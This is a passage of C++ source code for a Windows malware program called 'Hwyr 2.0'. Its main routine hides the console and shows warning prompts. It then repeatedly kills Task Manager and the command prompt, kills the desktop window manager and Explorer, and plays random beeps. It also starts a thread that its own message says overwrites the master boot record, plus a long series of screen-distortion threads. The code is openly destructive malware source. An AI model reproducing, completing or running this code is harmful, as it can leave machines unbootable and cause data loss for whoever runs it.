	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 90] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> t % 70 + 90);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
DWORD WINAPI TaskMgrObserver(LPVOID lpParam) {
	while (1) {
		system("taskkill /f /im taskmgr.exe");
		system("taskkill /f /im cmd.exe");
		Sleep(500);
	}
}
DWORD WINAPI beep(LPVOID lpParam) {
	DWORD v1; // ebx
	int v2; // eax

	while (1)
	{
		v1 = rand() % 999 + 50;
		v2 = rand();
		Beep(v2 % 3000 + 500, v1);
	}
}
VOID WINAPI Error() {
	if (MessageBoxW(NULL, L"Open your task manager or command prompt and terminate it before it becomes late.", L"Hwyr 2.0", MB_OK | MB_ICONERROR) == IDOK)
	{
	}
}
VOID WINAPI bsodiscoming() {
	if (MessageBoxW(NULL, L"BSOD is coming >:)", L"Hwyr 2.0 - Good luck >:)", MB_OK | MB_ICONERROR) == IDOK)
	{
	}
}
int main() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	if (MessageBoxW(NULL, L"This is dangerous file\r\n\It contains ton of harmful payloads\r\n\The creators are not responsible for any damages\r\n\Run malware?", L"Hwyr 2.0 (by MrSuperBuddy and Sohiel Shahrab)", MB_YESNO | MB_ICONWARNING) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"Are you sure?\r\n\It shuts down your Desktop windows manager, pervents taskmanager from starting (terminates it repeatly every half second) and overwrites mbr!!!\r\n\STILL WANNA RUN???.", L"Hwyr 2.0 (by MrSuperBuddy and Sohiel Shahrab)", MB_YESNO | MB_ICONWARNING) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			Error();
			Sleep(2500);
			HANDLE thread0 = CreateThread(0, 0, TaskMgrObserver, 0, 0, 0);
			HANDLE thread0dot1 = CreateThread(0, 0, mbr, 0, 0, 0);
			system("taskkill /f /im dwm.exe");
			Sleep(50);
			system("taskkill /f /im dwm.exe");
			Sleep(2500);
			HANDLE thread0dot2 = CreateThread(0, 0, beep, 0, 0, 0);
			HANDLE thread1 = CreateThread(0, 0, OldShader1, 0, 0, 0);
			Sleep(15000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			InvalidateRect(0, 0, 0);
			HANDLE thread2 = CreateThread(0, 0, Plgblt, 0, 0, 0);
			Sleep(15000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			InvalidateRect(0, 0, 0);
			HANDLE thread4 = CreateThread(0, 0, Shader1, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			InvalidateRect(0, 0, 0);
			HANDLE thread5 = CreateThread(0, 0, Shader2, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			InvalidateRect(0, 0, 0);
			HANDLE thread6 = CreateThread(0, 0, Shader3, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			InvalidateRect(0, 0, 0);
			HANDLE thread7 = CreateThread(0, 0, shader4, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread7, 0);
			CloseHandle(thread7);
			InvalidateRect(0, 0, 0);
			HANDLE thread8 = CreateThread(0, 0, shader5, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread8, 0);
			CloseHandle(thread8);
			InvalidateRect(0, 0, 0);
			HANDLE thread9 = CreateThread(0, 0, shader6, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread9, 0);
			CloseHandle(thread9);
			InvalidateRect(0, 0, 0);
			HANDLE thread10 = CreateThread(0, 0, shader7, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread10, 0);
			CloseHandle(thread10);
			InvalidateRect(0, 0, 0);
			HANDLE thread11 = CreateThread(0, 0, shader8, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread11, 0);
			CloseHandle(thread11);
			InvalidateRect(0, 0, 0);
			HANDLE thread12 = CreateThread(0, 0, shader9, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread12, 0);
			CloseHandle(thread12);
			InvalidateRect(0, 0, 0);
			HANDLE thread13 = CreateThread(0, 0, shader10, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread13, 0);
			CloseHandle(thread2);
			InvalidateRect(0, 0, 0);
			HANDLE thread14 = CreateThread(0, 0, shader11, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread14, 0);
			CloseHandle(thread14);
			InvalidateRect(0, 0, 0);
			HANDLE thread15 = CreateThread(0, 0, shader12, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread15, 0);
			CloseHandle(thread15);
			InvalidateRect(0, 0, 0);
			HANDLE thread16 = CreateThread(0, 0, shader13, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread16, 0);
			CloseHandle(thread16);
			InvalidateRect(0, 0, 0);
			HANDLE thread17 = CreateThread(0, 0, shader14, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread17, 0);
			CloseHandle(thread17);
			InvalidateRect(0, 0, 0);
			HANDLE thread18 = CreateThread(0, 0, shader15, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread18, 0);
			CloseHandle(thread18);
			InvalidateRect(0, 0, 0);
			HANDLE thread19 = CreateThread(0, 0, shader16, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread19, 0);
			CloseHandle(thread19);
			InvalidateRect(0, 0, 0);
			HANDLE thread20 = CreateThread(0, 0, shader17, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread20, 0);
			CloseHandle(thread20);
			InvalidateRect(0, 0, 0);
			system("taskkill /f /im explorer.exe");
			Sleep(50);
			InvalidateRect(0, 0, 0);
			system("taskkill /f /im explorer.exe");
			system("start winver.exe");
			TerminateThread(thread0dot1, 0);
			CloseHandle(thread0dot1);
			InvalidateRect(0, 0, 0);
			TerminateThread(thread0, 0);
			CloseHandle(thread0);
		}            
	}
}
